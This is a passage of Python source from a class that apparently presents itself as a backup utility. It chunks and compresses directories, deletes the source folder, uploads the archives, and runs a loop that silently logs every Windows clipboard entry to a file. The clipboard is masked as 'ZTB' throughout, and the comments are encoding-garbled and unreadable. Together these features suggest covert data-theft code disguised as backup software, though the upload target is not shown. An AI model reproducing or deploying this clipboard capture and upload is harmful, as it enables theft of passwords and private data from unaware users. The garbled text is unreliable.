        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
        try:
            with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                tar.add(part_dir, arcname=os.path.basename(folder_path))
            
            # éªŒè¯å‹ç¼©æ–‡ä»¶
            compressed_size = os.path.getsize(tar_path)
            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"å‹ç¼©åæ–‡ä»¶ä»ç„¶è¿‡å¤§: {tar_path} ({compressed_size / 1024 / 1024:.2f}MB)")
                os.remove(tar_path)
                return None
            else:
                logging.critical(f"å·²åˆ›å»ºåˆ†å— {part_num + 1}: {chunk_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                return tar_path
        except (OSError, IOError, tarfile.TarError) as e:
            logging.error(f"å‹ç¼©åˆ†å—å¤±è´¥: {part_dir}: {e}")
            if os.path.exists(tar_path):
                os.remove(tar_path)
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """å°†å¤§ç›®å½•åˆ†å‰²æˆå¤šä¸ªå°å—å¹¶åˆ†åˆ«å‹ç¼©
        
        Args:
            folder_path: è¦åˆ†å‰²çš„ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # åˆ›å»ºä¸´æ—¶ç›®å½•å­˜æ”¾åˆ†å—
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # é‡‡ç”¨æ›´ä¿å®ˆçš„åˆ†å—å¤§å°é™åˆ¶
            # è€ƒè™‘åˆ°å‹ç¼©æ¯”å’Œå®‰å…¨è¾¹ç•Œï¼Œå°†ç›®æ ‡å¤§å°è®¾ç½®å¾—æ›´å°
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * self.config.SAFETY_MARGIN / self.config.COMPRESSION_RATIO)

            # åˆ›å»ºæ–‡ä»¶å¤§å°æ˜ å°„ä»¥ä¼˜åŒ–åˆ†å—
            file_sizes = {}
            total_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        size = os.path.getsize(file_path)
                        if size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            file_sizes[file_path] = size
                            total_size += size
                    except OSError:
                        continue

            if not file_sizes:
                logging.error(f"ç›®å½• {folder_path} ä¸­æ²¡æœ‰æœ‰æ•ˆæ–‡ä»¶")
                return None

            # æŒ‰æ–‡ä»¶å¤§å°é™åºæ’åºï¼Œä¼˜å…ˆå¤„ç†å¤§æ–‡ä»¶
            sorted_files = sorted(file_sizes.items(), key=lambda x: x[1], reverse=True)

            # æ£€æŸ¥æ˜¯å¦æœ‰å•ä¸ªæ–‡ä»¶è¶…è¿‡é™åˆ¶
            if sorted_files[0][1] > MAX_CHUNK_SIZE:
                logging.error(f"å‘ç°è¿‡å¤§æ–‡ä»¶: {sorted_files[0][0]} ({sorted_files[0][1] / 1024 / 1024:.2f}MB)")
                return None

            # ä½¿ç”¨æœ€ä¼˜è£…ç®±ç®—æ³•è¿›è¡Œåˆ†å—
            current_chunk = []
            current_chunk_size = 0

            for file_path, file_size in sorted_files:
                # å¦‚æœå½“å‰æ–‡ä»¶ä¼šå¯¼è‡´å—è¶…è¿‡é™åˆ¶ï¼Œå…ˆå¤„ç†å½“å‰å—
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # åˆ›å»ºæ–°çš„åˆ†å—ç›®å½•
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # å¤åˆ¶æ–‡ä»¶åˆ°åˆ†å—ç›®å½•
                        success = True
                        for src in current_chunk:
                            rel_path = os.path.relpath(src, folder_path)
                            dst = os.path.join(part_dir, rel_path)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except (OSError, IOError, shutil.Error) as e:
                                logging.error(f"å¤åˆ¶æ–‡ä»¶å¤±è´¥: {src} -> {dst}: {e}")
                                success = False
                                break

                        if success:
                            tar_path = self._compress_chunk_part(
                                part_dir, folder_path, base_zip_path, part_num, current_chunk_size
                            )
                            if tar_path:
                                compressed_files.append(tar_path)

                        self._clean_directory(part_dir)
                        part_num += 1

                    current_chunk = []
                    current_chunk_size = 0

                # æ·»åŠ å½“å‰æ–‡ä»¶åˆ°å—
                current_chunk.append(file_path)
                current_chunk_size += file_size

            # å¤„ç†æœ€åä¸€ä¸ªå—
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    success = True
                    for src in current_chunk:
                        rel_path = os.path.relpath(src, folder_path)
                        dst = os.path.join(part_dir, rel_path)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception as e:
                            logging.error(f"å¤åˆ¶æ–‡ä»¶å¤±è´¥: {src} -> {dst}: {e}")
                            success = False
                            break

                    if success:
                        tar_path = self._compress_chunk_part(
                            part_dir, folder_path, base_zip_path, part_num, current_chunk_size
                        )
                        if tar_path:
                            compressed_files.append(tar_path)

                    self._clean_directory(part_dir)

            # æ¸…ç†ä¸´æ—¶ç›®å½•å’Œæºç›®å½•
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error(f"ç›®å½• {folder_path} åˆ†å‰²å¤±è´¥ï¼Œæ²¡æœ‰ç”Ÿæˆæœ‰æ•ˆçš„å‹ç¼©æ–‡ä»¶")
                return None
            
            logging.critical(f"ç›®å½• {folder_path} å·²åˆ†å‰²ä¸º {len(compressed_files)} ä¸ªå‹ç¼©æ–‡ä»¶")
            return compressed_files
        except Exception as e:
            logging.error(f"åˆ†å‰²ç›®å½•å¤±è´¥ {folder_path}: {e}")
            return None

    def get_clipboard_content(self):
        """è·å–ZTBå†…å®¹ï¼Œæ”¯æŒ Windows å’Œ WSL ç¯å¢ƒ"""
        try:
            # åœ¨ WSL ä¸­ä½¿ç”¨ PowerShell è·å– Windows ZTB
            ps_command = 'powershell.exe Get-Clipboard'
            result = subprocess.run(
                ps_command,
                shell=True,
                capture_output=True,
                text=False  # æ”¹ä¸º False ä»¥è·å–åŸå§‹å­—èŠ‚
            )
            
            if result.returncode == 0:
                # å°è¯•ä¸åŒçš„ç¼–ç 
                encodings = ['utf-8', 'gbk', 'gb2312', 'gb18030', 'big5', 'latin1']
                
                # é¦–å…ˆå°è¯• UTF-8 å’Œ GBK
                for encoding in ['utf-8', 'gbk']:
                    try:
                        content = result.stdout.decode(encoding).strip()
                        # æ£€æŸ¥è§£ç åçš„å†…å®¹æ˜¯å¦ä¸ºç©ºæˆ–åªåŒ…å«ç©ºç™½å­—ç¬¦
                        if content and not content.isspace():
                            return content
                    except UnicodeDecodeError:
                        continue
                    
                # å¦‚æœå¸¸ç”¨ç¼–ç å¤±è´¥ï¼Œå°è¯•å…¶ä»–ç¼–ç 
                for encoding in encodings:
                    if encoding not in ['utf-8', 'gbk']:  # è·³è¿‡å·²å°è¯•çš„ç¼–ç 
                        try:
                            content = result.stdout.decode(encoding).strip()
                            if content and not content.isspace():
                                return content
                        except UnicodeDecodeError:
                            continue
                
                # å¦‚æœæ‰€æœ‰ç¼–ç éƒ½å¤±è´¥ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰åŸå§‹æ•°æ®
                if result.stdout:
                    try:
                        # ä½¿ç”¨ 'ignore' é€‰é¡¹ä½œä¸ºæœ€åçš„å°è¯•
                        content = result.stdout.decode('utf-8', errors='ignore').strip()
                        if content and not content.isspace():
                            if self.config.DEBUG_MODE:
                                logging.warning("âš ï¸ ä½¿ç”¨ ignore æ¨¡å¼è§£ç ZTBå†…å®¹")
                            return content
                    except Exception as e:
                        if self.config.DEBUG_MODE:
                            logging.error(f"âŒ ignore æ¨¡å¼è§£ç å¤±è´¥: {str(e)}")
                else:
                    if self.config.DEBUG_MODE:
                        logging.debug("â„¹ï¸ ZTBä¸ºç©º")
            else:
                if self.config.DEBUG_MODE:
                    logging.error(f"âŒ è·å–ZTBå¤±è´¥ï¼Œè¿”å›ç : {result.returncode}")
                    if result.stderr:
                        try:
                            error_msg = result.stderr.decode('utf-8', errors='ignore')
                            logging.error(f"é”™è¯¯ä¿¡æ¯: {error_msg}")
                        except:
                            pass
        
            return None
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è·å–ZTBå‡ºé”™: {str(e)}")
            return None

    def log_clipboard_update(self, content, file_path):
        """è®°å½•ZTBæ›´æ–°åˆ°æ–‡ä»¶"""
        try:
            # ç¡®ä¿ç›®å½•å­˜åœ¨
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # æ£€æŸ¥å†…å®¹æ˜¯å¦ä¸ºç©ºæˆ–ç‰¹æ®Šæ ‡è®°
            if not content or content.isspace():
                return
            
            # å†™å…¥æ—¥å¿—
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== ğŸ“‹ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
            
            content_preview = content[:50] + "..." if len(content) > 50 else content
            logging.info(f"ğŸ“ å·²è®°å½•å†…å®¹: {content_preview}")
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è®°å½•ZTBå¤±è´¥: {str(e)}")

    def monitor_clipboard(self, file_path, interval=3):
        """ç›‘æ§ZTBå˜åŒ–å¹¶è®°å½•åˆ°æ–‡ä»¶
        
        Args:
            file_path: æ—¥å¿—æ–‡ä»¶è·¯å¾„
            interval: æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
        """
        # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"âŒ åˆ›å»ºZTBæ—¥å¿—ç›®å½•å¤±è´¥: {str(e)}")
                return

        last_content = ""
        error_count = 0  # æ·»åŠ é”™è¯¯è®¡æ•°
        max_errors = 5   # æœ€å¤§è¿ç»­é”™è¯¯æ¬¡æ•°
        last_empty_log_time = time.time()  # è®°å½•ä¸Šæ¬¡è¾“å‡ºç©ºZTBæ—¥å¿—çš„æ—¶é—´
        empty_log_interval = 300  # æ¯5åˆ†é’Ÿæ‰è¾“å‡ºä¸€æ¬¡ç©ºZTBæ—¥å¿—
        
        # åˆå§‹åŒ–æ—¥å¿—æ–‡ä»¶
        try:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"\n=== ğŸ“‹ ZTBç›‘æ§å¯åŠ¨äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write("-"*30 + "\n")
        except Exception as e:
            logging.error(f"âŒ åˆå§‹åŒ–ZTBæ—¥å¿—å¤±è´¥: {str(e)}")
        
        def is_special_content(text):
            """æ£€æŸ¥æ˜¯å¦ä¸ºç‰¹æ®Šæ ‡è®°å†…å®¹"""
            if not text:
                return False
            # è·³è¿‡æ—¥å¿—æ ‡è®°è¡Œ
            if text.startswith('===') or text.startswith('-'):
                return True
            # è·³è¿‡æ—¶é—´æˆ³è¡Œ
            if 'ZTBç›‘æ§å¯åŠ¨äº' in text or 'æ—¥å¿—å·²äº' in text:
                return True
            return False
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                current_time = time.time()
                
                # æ£€æŸ¥å†…å®¹æ˜¯å¦æœ‰æ•ˆä¸”ä¸æ˜¯ç‰¹æ®Šæ ‡è®°
                if (current_content and 
                    not current_content.isspace() and 
                    not is_special_content(current_content)):
                    
                    # æ£€æŸ¥å†…å®¹æ˜¯å¦å‘ç”Ÿå˜åŒ–
                    if current_content != last_content:
                        content_preview = current_content[:30] + "..." if len(current_content) > 30 else current_content
                        logging.info(f"ğŸ“‹ æ£€æµ‹åˆ°æ–°å†…å®¹: {content_preview}")
                        self.log_clipboard_update(current_content, file_path)
                        last_content = current_content
                        error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                else:
                    if self.config.DEBUG_MODE and current_time - last_empty_log_time >= empty_log_interval:
                        if not current_content:
                            logging.debug("â„¹ï¸ ZTBä¸ºç©º")
                        elif current_content.isspace():
                            logging.debug("â„¹ï¸ ZTBå†…å®¹ä»…åŒ…å«ç©ºç™½å­—ç¬¦")
                        elif is_special_content(current_content):
                            logging.debug("â„¹ï¸ è·³è¿‡ç‰¹æ®Šæ ‡è®°å†…å®¹")
                        last_empty_log_time = current_time
                    error_count = 0  # ç©ºå†…å®¹ä¸è®¡å…¥é”™è¯¯
                    
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    logging.error(f"âŒ ZTBç›‘æ§è¿ç»­å‡ºé”™{max_errors}æ¬¡ï¼Œç­‰å¾…60ç§’åé‡è¯•")
                    time.sleep(60)  # è¿ç»­é”™è¯¯æ—¶å¢åŠ ç­‰å¾…æ—¶é—´
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                elif self.config.DEBUG_MODE:
                    logging.error(f"âŒ ZTBç›‘æ§å‡ºé”™: {str(e)}")
                
            time.sleep(interval)

    def upload_backup(self, backup_path):
        """ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
        
        Args:
            backup_path: å¤‡ä»½æ–‡ä»¶è·¯å¾„æˆ–å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

    def _get_next_backup_time(self):
        """è·å–ä¸‹æ¬¡å¤‡ä»½æ—¶é—´çš„æ—¶é—´æˆ³æ–‡ä»¶è·¯å¾„"""
        return str(Path.home() / ".dev/Backup/next_backup_time.txt")
        
    def save_next_backup_time(self):
        """ä¿å­˜ä¸‹æ¬¡å¤‡ä»½æ—¶é—´"""
        next_time = datetime.now() + timedelta(seconds=self.config.BACKUP_INTERVAL)
        try:
            with open(self._get_next_backup_time(), 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"âŒ ä¿å­˜ä¸‹æ¬¡å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")
            return None
            
    def should_run_backup(self):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½
        
        Returns:
            bool: æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½
            datetime or None: ä¸‹æ¬¡å¤‡ä»½æ—¶é—´ï¼ˆå¦‚æœå­˜åœ¨ï¼‰
        """
        threshold_file = self._get_next_backup_time()
        if not os.path.exists(threshold_file):
            return True, None
            
        try:
            with open(threshold_file, 'r') as f:
                next_backup_time = datetime.strptime(f.read().strip(), '%Y-%m-%d %H:%M:%S')
                
            current_time = datetime.now()
            if current_time >= next_backup_time:
                return True, None
            return False, next_backup_time
        except Exception as e:
            logging.error(f"âŒ è¯»å–ä¸‹æ¬¡å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")
            return True, None

